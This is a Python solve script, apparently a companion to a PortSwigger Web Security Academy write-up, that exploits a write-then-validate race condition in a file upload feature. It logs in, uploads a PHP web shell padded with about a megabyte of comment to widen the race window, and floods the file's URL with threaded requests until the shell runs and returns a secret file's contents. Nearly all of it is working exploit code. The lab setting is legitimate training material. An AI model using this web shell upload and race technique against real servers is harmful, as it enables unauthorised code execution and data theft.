#!/usr/bin/env python3
"""
Web shell upload via race condition
PortSwigger Web Security Academy -- File Upload

Companion script for the writeup: 07-web-shell-upload-via-race-condition.md

What this does -- and why it isn't a single request:
    This lab's validation (checkFileType()-style, effectively equivalent to
    checkViruses()) genuinely rejects every static bypass -- content-type
    spoofing, extension tricks, path traversal, the polyglot from lab 6.
    The bug is timing, not a parsing gap: the server calls
    move_uploaded_file() to write the file to disk, THEN validates it, and
    only unlink()s it if validation fails. Between those two steps the file
    is live and servable.

    We didn't have Turbo Intruder's "gate" feature (which releases a batch
    of queued requests onto the wire in the same instant) available for this
    run, so this script substitutes volume and a stretched window for exact
    synchronization: it pads the PHP payload with ~1MB of a harmless comment
    block (a bigger file takes the server's own validation step measurably
    longer to process, widening the race window), then per attempt fires one
    upload POST plus ten threads each hammering the target URL with 20 GETs
    apiece via a ThreadPoolExecutor, using a SEPARATE httpx session for the
    fetch threads so they aren't serialized behind the upload session. It
    loops that whole burst across multiple attempts until a GET lands inside
    the window and comes back with the secret instead of PHP source or a
    rejection page.

Usage:
    python 07-web-shell-upload-via-race-condition.py <lab-url>
    e.g. python 07-web-shell-upload-via-race-condition.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import threading
import httpx
from concurrent.futures import ThreadPoolExecutor

PHP_SHELL = "<?php echo file_get_contents('/home/carlos/secret'); ?>"
FILENAME = "exploit.php"
ATTEMPTS = 100


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, base: str) -> bool:
    csrf = _get_csrf(client, f"{base}/login")
    r = client.post(f"{base}/login", data={
        "csrf": csrf, "username": "wiener", "password": "peter",
    }, follow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("location", "/")
        if loc.startswith("/"):
            loc = f"{base}{loc}"
        client.get(loc, follow_redirects=True)
    return "session" in str(client.cookies)


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, verify=False, timeout=15)
    if not _login(client, lab_url):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    file_url = f"{lab_url}/files/avatars/{FILENAME}"
    found_secret = threading.Event()
    result_holder = [None]

    # Pad the payload to stretch the validation window (checkViruses() takes
    # measurably longer on a bigger file, widening the write-then-delete gap).
    junk_padding = "/*" + ("A" * 1024 * 1024) + "*/"
    padded_shell = PHP_SHELL.replace("?>", f" {junk_padding} ?>")

    # Separate session for fetching -- avoids serializing races behind the
    # upload session's own connection/thread handling.
    fetch_client = httpx.Client(follow_redirects=True, verify=False, timeout=5)
    if not _login(fetch_client, lab_url):
        print("[-] Fetch-session login failed")
        return

    csrf = _get_csrf(client, f"{lab_url}/my-account")

    def _upload_once():
        nonlocal csrf
        try:
            client.post(f"{lab_url}/my-account/avatar",
                       files={"avatar": (FILENAME, padded_shell.encode(), "application/x-php")},
                       data={"csrf": csrf, "user": "wiener"})
            csrf_page = client.get(f"{lab_url}/my-account")
            m = re.search(r'name="csrf"\s+value="([^"]+)"', csrf_page.text)
            if m:
                csrf = m.group(1)
        except Exception:
            pass

    def _fetch_burst():
        for _ in range(20):
            if found_secret.is_set():
                return
            try:
                r = fetch_client.get(file_url)
                if (r.status_code == 200 and "<?php" not in r.text
                        and "Sorry" not in r.text and len(r.text.strip()) > 0):
                    result_holder[0] = r.text.strip()
                    found_secret.set()
                    return
            except Exception:
                pass

    print(f"[*] Racing {ATTEMPTS} upload+fetch attempts (10 threads x 20 GETs each per attempt)...")
    try:
        for i in range(ATTEMPTS):
            if found_secret.is_set():
                break

            with ThreadPoolExecutor(max_workers=12) as pool:
                pool.submit(_upload_once)
                fetch_futures = [pool.submit(_fetch_burst) for _ in range(10)]
                for f in fetch_futures:
                    f.result()

            if found_secret.is_set():
                break

            if (i + 1) % 20 == 0:
                print(f"[*] ... {i + 1}/{ATTEMPTS} attempts")
    finally:
        fetch_client.close()

    if not result_holder[0]:
        print(f"[-] Race condition failed after {ATTEMPTS} attempts -- rerun or raise ATTEMPTS")
        return

    secret = result_holder[0]
    print(f"[+] Race won -- secret: {secret}")
    client.post(f"{lab_url}/submitSolution", data={"answer": secret})

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet -- double-check the extracted secret.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
